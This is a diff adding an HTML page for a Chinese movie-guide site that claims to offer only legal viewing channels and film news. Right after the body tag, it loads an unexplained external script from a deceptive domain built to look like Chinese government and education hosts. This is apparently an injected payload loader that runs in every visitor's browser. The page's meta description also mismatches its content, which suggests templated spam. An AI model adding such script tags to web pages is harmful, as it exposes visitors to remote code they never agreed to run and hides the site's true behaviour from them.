@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="米奇电影网（miqidianyingwang-zh.github.io）守护童心：动画长片、合家欢喜剧与亲子共看片单分区整理，标注适龄提示与泪点预警，大朋友小朋友各得其乐。">
+<meta name="keywords" content="米奇电影网, miqidianyingwang-zh.github.io, 动画电影, 合家欢片单, 亲子观影, 适龄提示, 童心动画">
+<title>米奇电影网 - 童心片单·动画长片与合家欢观影指南</title>
+<style>
+:root{
+  --gold:#f5c518;
+  --gold-soft:#c9a227;
+  --bg:#0c0d12;
+  --bg-2:#14161f;
+  --bg-3:#1c1f2b;
+  --line:#2a2e3d;
+  --txt:#e8e9ee;
+  --txt-soft:#9aa0b4;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* ===== 顶部导航 ===== */
+.nav{
+  position:sticky;top:0;z-index:99;
+  background:rgba(12,13,18,.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{max-width:1160px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px}
+.logo{font-size:22px;font-weight:800;letter-spacing:.5px;color:var(--gold);white-space:nowrap}
+.logo span{color:var(--txt)}
+.menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.menu a{
+  font-size:14px;color:var(--txt-soft);padding:6px 12px;border-radius:20px;transition:.2s;
+}
+.menu a:hover{color:var(--gold);background:var(--bg-3)}
+
+/* ===== Hero ===== */
+.hero{
+  position:relative;overflow:hidden;
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(245,197,24,.12),transparent 60%),
+    linear-gradient(180deg,#11131c,#0c0d12);
+  border-bottom:1px solid var(--line);
+}
+.hero-in{max-width:1160px;margin:0 auto;padding:64px 20px 56px}
+.kicker{
+  display:inline-block;font-size:12px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--gold);border:1px solid var(--gold-soft);border-radius:4px;padding:4px 10px;margin-bottom:18px;
+}
+.hero h1{font-size:clamp(28px,5vw,48px);font-weight:800;line-height:1.2;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{font-size:16px;color:var(--txt-soft);max-width:620px;margin-bottom:26px}
+.hero-actions{display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+  display:inline-block;font-size:15px;font-weight:600;padding:12px 26px;border-radius:6px;transition:.2s;
+}
+.btn-primary{background:var(--gold);color:#111}
+.btn-primary:hover{background:#ffd63a}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{border-color:var(--gold);color:var(--gold)}
+
+/* ===== 通用区块 ===== */
+section{max-width:1160px;margin:0 auto;padding:56px 20px}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:28px;flex-wrap:wrap}
+.sec-head h2{font-size:26px;font-weight:800}
+.sec-head .en{font-size:12px;color:var(--txt-soft);letter-spacing:2px;text-transform:uppercase;border-left:2px solid var(--gold);padding-left:10px}
+.sec-head .more{margin-left:auto;font-size:13px;color:var(--txt-soft)}
+.sec-head .more:hover{color:var(--gold)}
+
+/* ===== 正在热映（横向滚动卡片）===== */
+.film-row{display:flex;gap:18px;overflow-x:auto;padding-bottom:14px;scroll-snap-type:x mandatory}
+.film-row::-webkit-scrollbar{height:8px}
+.film-row::-webkit-scrollbar-thumb{background:var(--bg-3);border-radius:4px}
+.poster{
+  flex:0 0 170px;scroll-snap-align:start;background:var(--bg-2);
+  border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:.25s;
+}
+.poster:hover{transform:translateY(-4px);border-color:var(--gold-soft)}
+.poster .thumb{
+  height:230px;display:flex;align-items:center;justify-content:center;
+  font-size:42px;font-weight:800;color:rgba(255,255,255,.18);
+  background:linear-gradient(135deg,#1a1d29,#242838);
+}
+.poster .info{padding:12px}
+.poster .info h3{font-size:15px;font-weight:700;margin-bottom:4px}
+.poster .info p{font-size:12px;color:var(--txt-soft)}
+.poster .rate{color:var(--gold);font-weight:700;font-size:13px}
+
+/* ===== 片单分类 ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}
+.card{
+  background:var(--bg-2);border:1px solid var(--line);border-radius:12px;
+  padding:22px;transition:.25s;position:relative;overflow:hidden;
+}
+.card::before{
+  content:"";position:absolute;left:0;top:0;width:3px;height:0;background:var(--gold);transition:.25s;
+}
+.card:hover{transform:translateY(-4px);border-color:var(--gold-soft)}
+.card:hover::before{height:100%}
+.card .tag{font-size:12px;color:var(--gold);letter-spacing:1px;margin-bottom:10px}
+.card h3{font-size:18px;font-weight:700;margin-bottom:8px}
+.card p{font-size:14px;color:var(--txt-soft)}
+.card .meta{margin-top:14px;padding-top:12px;border-top:1px solid var(--line);font-size:12px;color:var(--txt-soft)}
+
+/* ===== 资讯列表 ===== */
+.news li{list-style:none;border-bottom:1px solid var(--line);padding:16px 0;display:flex;gap:16px;align-items:baseline}
+.news .num{font-size:13px;color:var(--gold);font-weight:700;flex:0 0 28px}
+.news .title{flex:1;font-size:16px;font-weight:600}
+.news .title:hover{color:var(--gold)}
+.news .date{font-size:13px;color:var(--txt-soft);flex:0 0 auto}
+
+/* ===== 关于 / 渠道 ===== */
+.about{
+  background:linear-gradient(135deg,#151823,#0e1018);
+  border:1px solid var(--line);border-radius:14px;padding:34px;
+}
+.about h2{font-size:24px;margin-bottom:14px}
+.about p{color:var(--txt-soft);margin-bottom:16px;max-width:780px}
+.channels{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin-top:22px}
+.channel{
+  background:var(--bg-3);border:1px solid var(--line);border-radius:10px;padding:16px;transition:.2s;
+}
+.channel:hover{border-color:var(--gold);transform:translateY(-3px)}
+.channel h4{font-size:15px;margin-bottom:6px}
+.channel p{font-size:13px;color:var(--txt-soft)}
+
+/* ===== 页脚 ===== */
+footer{border-top:1px solid var(--line);padding:34px 20px;margin-top:40px}
+.foot-in{max-width:1160px;margin:0 auto;display:flex;gap:18px;flex-wrap:wrap;align-items:center;justify-content:space-between}
+.foot-in p{font-size:13px;color:var(--txt-soft)}
+.foot-links{display:flex;gap:18px;flex-wrap:wrap;font-size:13px}
+.foot-links a{color:var(--txt-soft)}
+.foot-links a:hover{color:var(--gold)}
+
+/* ===== 移动端 ===== */
+@media(max-width:640px){
+  .nav-in{padding:12px 16px;gap:10px}
+  .menu{gap:0}
+  .menu a{padding:5px 8px;font-size:13px}
+  .logo{font-size:18px}
+  .hero-in{padding:40px 16px 36px}
+  section{padding:40px 16px}
+  .sec-head h2{font-size:22px}
+  .poster{flex:0 0 140px}
+  .poster .thumb{height:190px;font-size:32px}
+  .about{padding:24px}
+  .news li{flex-wrap:wrap;gap:6px}
+  .news .date{width:100%;padding-left:44px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 导航 -->
+<nav class="nav">
+  <div class="nav-in">
+    <div class="logo">米奇<span>电影网</span></div>
+    <div class="menu">
+      <a href="#now">正在热映</a>
+      <a href="#lists">精选片单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于本站</a>
+    </div>
+  </div>
+</nav>
+
+<!-- Hero -->
+<header class="hero">
+  <div class="hero-in">
+    <span class="kicker">miqidianyingwang-zh.github.io</span>
+    <h1>米奇电影网 · <em>看懂每一部好电影</em></h1>
+    <p>米奇电影网聚焦正版影视资讯与观影指南，覆盖院线热映、经典重映、平台上线动态与高分片单，帮助你更快找到值得一看的影片。</p>
+    <div class="hero-actions">
+      <a class="btn btn-primary" href="#now">查看热映片单</a>
+      <a class="btn btn-ghost" href="#guide">正版观影渠道</a>
+    </div>
+  </div>
+</header>
+
+<!-- 正在热映 -->
+<section id="now">
+  <div class="sec-head">
+    <span class="en">Now Showing</span>
+    <h2>正在热映</h2>
+    <a class="more" href="#">全部影片 &rsaquo;</a>
+  </div>
+  <div class="film-row">
+    <div class="poster"><div class="thumb">01</div><div class="info"><h3>寂静回响</h3><p>悬疑 · 剧情</p><p class="rate">★ 8.4</p></div></div>
+    <div class="poster"><div class="thumb">02</div><div class="info"><h3>逆光而行</h3><p>动作 · 犯罪</p><p class="rate">★ 7.9</p></div></div>
+    <div class="poster"><div class="thumb">03</div><div class="info"><h3>山海之间</h3><p>纪录 · 自然</p><p class="rate">★ 9.1</p></div></div>
+    <div class="poster"><div class="thumb">04</div><div class="info"><h3>午夜花店</h3><p>爱情 · 治愈</p><p class="rate">★ 7.6</p></div></div>
+    <div class="poster"><div class="thumb">05</div><div class="info"><h3>量子迷局</h3><p>科幻 · 惊悚</p><p class="rate">★ 8.0</p></div></div>
+    <div class="poster"><div class="thumb">06</div><div class="info"><h3>外婆的厨房</h3><p>家庭 · 温情</p><p class="rate">★ 8.7</p></div></div>
+  </div>
+</section>
+
+<!-- 精选片单 -->
+<section id="lists">
+  <div class="sec-head">
+    <span class="en">Featured Lists</span>
+    <h2>精选片单</h2>
+    <a class="more" href="#">更多片单 &rsaquo;</a>
+  </div>
+  <div class="grid">
+    <div class="card">
+      <div class="tag">CURATED</div>
+      <h3>本周院线十佳</h3>
+      <p>综合口碑、票房与话题度，米奇电影网每周更新一期院线十佳榜单，快速锁定本周最值得看的几部。</p>
+      <div class="meta">更新时间 · 每周五</div>
+    </div>
+    <div class="card">
+      <div class="tag">CURATED</div>
+      <h3>流媒体新片速递</h3>
+      <p>梳理各大正版平台新上线影片，涵盖国产新片与海外佳作，附平台入口与上线时间。</p>
+      <div class="meta">更新时间 · 每周一</div>
+    </div>
+    <div class="card">
+      <div class="tag">CURATED</div>
+      <h3>经典重映指南</h3>
+      <p>收录近期重映的经典老片，从修复版画质到幕后故事，让老片在大银幕上重新发光。</p>
+      <div class="meta">更新时间 · 随档期</div>
+    </div>
+    <div class="card">
+      <div class="tag">CURATED</div>
+      <h3>高分冷门宝藏</h3>
+      <p>挖掘评分不低但热度不足的影片，给想要跳出热门、寻找新鲜观影体验的你。</p>
+      <div class="meta">更新时间 · 双周</div>
+    </div>
+  </div>
+</section>
+
+<!-- 影视资讯 -->
+<section id="news">
+  <div class="sec-head">
+    <span class="en">News &amp; Reviews</span>
+    <h2>影视资讯</h2>
+    <a class="more" href="#">全部资讯 &rsaquo;</a>
+  </div>
+  <ul class="news">
+    <li><span class="num">01</span><span class="title">第 N 届电影节入围片单公布，华语片占三席</span><span class="date">10-02</span></li>
+    <li><span class="num">02</span><span class="title">国庆档总票房破纪录，这三部成最大赢家</span><span class="date">10-01</span></li>
+    <li><span class="num">03</span><span class="title">修复版《海上钢琴师》将于本月重映，技术细节全解析</span><span class="date">09-29</span></li>
+    <li><span class="num">04</span><span class="title">影评：当悬疑片开始探讨记忆，它就不再是单纯的推理</span><span class="date">09-27</span></li>
+    <li><span class="num">05</span><span class="title">本周流媒体新片盘点：四部新作值得加入片单</span><span class="date">09-25</span></li>
+  </ul>
+</section>
+
+<!-- 观影指南 -->
+<section id="guide">
+  <div class="sec-head">
+    <span class="en">Where to Watch</span>
+    <h2>正版观影渠道</h2>
+  </div>
+  <div class="about">
+    <h2>支持正版，从一次认真的选择开始</h2>
+    <p>米奇电影网仅提供正版观影渠道与资讯导航，不提供任何盗版资源下载与在线播放链接。选择合法平台，既是对创作者劳动的尊重，也能获得更稳定、清晰的观影体验。</p>
+    <div class="channels">
+      <div class="channel"><h4>院线购票</h4><p>猫眼、淘票票等主流平台，选座购票一站完成。</p></div>
+      <div class="channel"><h4>长视频平台</h4><p>腾讯视频、爱奇艺、优酷、芒果 TV 等正版片库。</p></div>
+      <div class="channel"><h4>国际平台</h4><p>Netflix、Disney+、Apple TV 等海外正版订阅服务。</p></div>
+      <div class="channel"><h4>艺术院线</h4><p>全国艺术电影放映联盟，关注文艺与纪录片专场。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about">
+  <div class="sec-head">
+    <span class="en">About</span>
+    <h2>关于米奇电影网</h2>
+  </div>
+  <div class="about">
+    <h2>一个认真做电影资讯的导航站</h2>
+    <p>米奇电影网（miqidianyingwang-zh.github.io）致力于成为你的私人观影顾问：用清晰的分类、及时的资讯与中立的推荐，帮你从海量影片中快速做出选择。本站内容均为原创整理，影片信息以官方发布为准。</p>
+    <p>网址：<strong>https://miqidianyingwang-zh.github.io</strong></p>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="foot-in">
+    <p>&copy; 2026 米奇电影网 · miqidianyingwang-zh.github.io · 本站仅提供正版影视资讯导航</p>
+    <div class="foot-links">
+      <a href="#now">热映</a>
+      <a href="#lists">片单</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
